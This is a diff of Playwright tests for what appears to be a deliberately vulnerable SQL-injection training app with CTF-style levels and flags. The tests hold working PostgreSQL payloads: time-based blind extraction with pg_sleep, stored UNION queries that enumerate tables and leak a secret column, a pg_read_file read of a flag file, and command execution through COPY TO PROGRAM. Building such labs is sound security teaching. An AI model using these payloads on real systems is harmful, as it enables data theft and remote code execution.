@@ -234,10 +234,51 @@ test.describe('Level 2-2: Time-Based Blind SQLi', () => {
     expect(Date.now() - start).toBeLessThan(SLEEP_THRESHOLD)
   })
 
-  test('congrats banner appears on last character confirmation with timing', async ({ page }) => {
+  test('congrats banner appears on last character confirmation with timing and links to /reservas', async ({ page }) => {
     await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,27,1) FROM unsuspecting_table WHERE id=1)='}' THEN 3 ELSE 0 END))a)--")
     await page.click('.search-btn')
     await expect(page.locator('.congrats-22')).toBeVisible({ timeout: 10000 })
+    await expect(page.locator('.congrats-22 .congrats-next')).toHaveAttribute('href', '/reservas')
+  })
+})
+
+test.describe('Level 2-3: Second-Order (Stored) SQLi', () => {
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/reservas')
+  })
+
+  test('step 1 - store UNION payload, trigger reveals lista_vip table name', async ({ page }) => {
+    const codigo = `S1${runId}`
+    await page.fill('#reservar-nome', `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_name='lista_vip'--`)
+    await page.fill('#reservar-codigo', codigo)
+    await page.click('.reservar-btn')
+    await expect(page.locator('.reserva-msg')).toBeVisible()
+    await page.fill('#consultar-codigo', codigo)
+    await page.click('.consultar-btn')
+    await expect(page.locator('.setor-result')).toContainText('lista_vip')
+  })
+
+  test('step 2 - store UNION payload, trigger reveals segredo column name', async ({ page }) => {
+    const codigo = `S2${runId}`
+    await page.fill('#reservar-nome', `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='lista_vip' AND column_name='segredo'--`)
+    await page.fill('#reservar-codigo', codigo)
+    await page.click('.reservar-btn')
+    await expect(page.locator('.reserva-msg')).toBeVisible()
+    await page.fill('#consultar-codigo', codigo)
+    await page.click('.consultar-btn')
+    await expect(page.locator('.setor-result')).toContainText('segredo')
+  })
+
+  test('step 3 - store flag extraction payload, trigger leaks flag from lista_vip', async ({ page }) => {
+    const codigo = `S3${runId}`
+    await page.fill('#reservar-nome', `' UNION SELECT segredo FROM lista_vip--`)
+    await page.fill('#reservar-codigo', codigo)
+    await page.click('.reservar-btn')
+    await expect(page.locator('.reserva-msg')).toBeVisible()
+    await page.fill('#consultar-codigo', codigo)
+    await page.click('.consultar-btn')
+    await expect(page.locator('.setor-result')).toContainText('JUMENTOS{')
+    await expect(page.locator('.congrats-23')).toBeVisible()
   })
 })
 
@@ -302,61 +343,30 @@ test.describe('Level 3-2: WAF Bypass via Keyword Nesting', () => {
   })
 })
 
-test.describe('Level 3-3: File Read via pg_read_file', () => {
+test.describe('Level 3-3: RCE via COPY TO PROGRAM', () => {
+  const SLEEP_THRESHOLD = 2500
+
   test.beforeEach(async ({ page }) => {
     await page.goto('/secrets')
   })
 
-  test('step 1 - normal query returns config value', async ({ page }) => {
+  test('step 1 - any query always returns producao (blind, no output channel)', async ({ page }) => {
     await page.fill('.search-bar input', 'db_version')
     await page.click('.search-btn')
-    await expect(page.locator('.result-valor')).toContainText('PostgreSQL')
+    await expect(page.locator('.result-valor')).toContainText('producao')
   })
 
-  test('step 2 - UNION pg_read_file reads flag file and triggers congrats', async ({ page }) => {
-    await page.fill('.search-bar input', "' UNION SELECT pg_read_file('/secrets/flag.txt')--")
+  test('step 2 - pg_sleep confirms stacked query injection via timing', async ({ page }) => {
+    const start = Date.now()
+    await page.fill('.search-bar input', "'; SELECT pg_sleep(3)--")
     await page.click('.search-btn')
-    await expect(page.locator('.result-valor')).toContainText('JUMENTOS{')
-    await expect(page.locator('.congrats-33')).toBeVisible()
-  })
-})
-
-test.describe('Level 2-3: Second-Order (Stored) SQLi', () => {
-  test.beforeEach(async ({ page }) => {
-    await page.goto('/tickets')
+    await page.waitForSelector('.result-valor')
+    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
   })
 
-  test('step 1 - store UNION payload, trigger reveals lista_vip table name', async ({ page }) => {
-    const codigo = `S1${runId}`
-    await page.fill('#reservar-nome', `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_name='lista_vip'--`)
-    await page.fill('#reservar-codigo', codigo)
-    await page.click('.reservar-btn')
-    await expect(page.locator('.reserva-msg')).toBeVisible()
-    await page.fill('#consultar-codigo', codigo)
-    await page.click('.consultar-btn')
-    await expect(page.locator('.setor-result')).toContainText('lista_vip')
-  })
-
-  test('step 2 - store UNION payload, trigger reveals segredo column name', async ({ page }) => {
-    const codigo = `S2${runId}`
-    await page.fill('#reservar-nome', `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='lista_vip' AND column_name='segredo'--`)
-    await page.fill('#reservar-codigo', codigo)
-    await page.click('.reservar-btn')
-    await expect(page.locator('.reserva-msg')).toBeVisible()
-    await page.fill('#consultar-codigo', codigo)
-    await page.click('.consultar-btn')
-    await expect(page.locator('.setor-result')).toContainText('segredo')
-  })
-
-  test('step 3 - store flag extraction payload, trigger leaks flag from lista_vip', async ({ page }) => {
-    const codigo = `S3${runId}`
-    await page.fill('#reservar-nome', `' UNION SELECT segredo FROM lista_vip--`)
-    await page.fill('#reservar-codigo', codigo)
-    await page.click('.reservar-btn')
-    await expect(page.locator('.reserva-msg')).toBeVisible()
-    await page.fill('#consultar-codigo', codigo)
-    await page.click('.consultar-btn')
-    await expect(page.locator('.setor-result')).toContainText('JUMENTOS{')
-    await expect(page.locator('.congrats-23')).toBeVisible()
+  test('step 3 - COPY TO PROGRAM executes command, response is still producao', async ({ page }) => {
+    await page.fill('.search-bar input', "'; COPY (SELECT 1) TO PROGRAM 'echo rce-test'--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-valor')).toContainText('producao')
   })
 })
